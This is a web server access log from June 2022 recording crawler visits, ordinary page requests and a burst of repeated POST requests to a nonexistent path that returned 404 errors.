179.60.150.123 - - [13/Jun/2022:11:21:18 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:19 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:19 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:20 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:21 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:22 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:23 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:24 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:24 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:25 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:27 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:28 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:29 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
179.60.150.123 - - [13/Jun/2022:11:21:31 +0200] "POST /EDMA1/EDMA1 HTTP/1.1" 404 8363 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.11 Safari/534.16"
66.249.69.196 - - [13/Jun/2022:11:22:42 +0200] "GET /app-ads.txt HTTP/1.1" 404 270 "-" "Google-adstxt"
54.36.148.121 - - [13/Jun/2022:11:23:12 +0200] "GET /Ywesee/SpezialisierteKrankenkasse HTTP/1.1" 200 14829 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.43 - - [13/Jun/2022:11:30:14 +0200] "GET /Main/EANCode?n=Main.SideBar%3Faction%3Dedit HTTP/1.1" 302 157 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
89.246.241.14 - - [13/Jun/2022:11:36:25 +0200] "GET /Ausschreibung/SAI HTTP/1.1" 200 10366 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
89.246.241.14 - - [13/Jun/2022:11:36:57 +0200] "GET /Software/SoftwareRaid HTTP/1.1" 200 12104 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
194.209.200.2 - - [13/Jun/2022:11:40:52 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:40:52 +0200] "GET /Oddb2xml/Index HTTP/1.1" 200 8983 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
207.46.13.39 - - [13/Jun/2022:11:41:03 +0200] "GET / HTTP/1.1" 200 11562 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
194.209.200.2 - - [13/Jun/2022:11:41:09 +0200] "GET /AmiKo/Linux HTTP/1.1" 200 9217 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:43:14 +0200] "GET /Main/2006 HTTP/1.1" 200 39320 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:43:34 +0200] "GET /Main/2015 HTTP/1.1" 200 15908 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:43:52 +0200] "GET /Main/2011 HTTP/1.1" 200 21451 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:43:54 +0200] "GET /AmiKo/IOS HTTP/1.1" 200 11930 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:43:58 +0200] "GET /Ywesee/Kontakt HTTP/1.1" 200 8973 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:45:54 +0200] "GET /Software/ODDB HTTP/1.1" 200 10298 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:46:23 +0200] "GET /Ausschreibung/SAI HTTP/1.1" 200 10366 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:47:00 +0200] "GET /Main/2009 HTTP/1.1" 200 21688 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:47:09 +0200] "GET /Main/2007 HTTP/1.1" 200 50639 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:47:27 +0200] "GET /Main/2016 HTTP/1.1" 200 13689 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:47:36 +0200] "GET /Main/2014 HTTP/1.1" 200 19471 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:47:51 +0200] "GET /Main/2010 HTTP/1.1" 200 27997 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:47:59 +0200] "GET /Main/ComCo19122016 HTTP/1.1" 200 10547 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
194.209.200.2 - - [13/Jun/2022:11:48:00 +0200] "GET /Eggze/SpreadIt HTTP/1.1" 200 12537 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
185.191.171.11 - - [13/Jun/2022:11:53:04 +0200] "GET /robots.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.19 - - [13/Jun/2022:11:53:04 +0200] "GET /Main/2013?action=diff HTTP/1.1" 403 18 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
89.246.241.14 - - [13/Jun/2022:11:55:15 +0200] "GET /Main/2021 HTTP/1.1" 200 16484 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
89.246.241.14 - - [13/Jun/2022:11:55:31 +0200] "GET /Main/2020 HTTP/1.1" 200 15398 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"
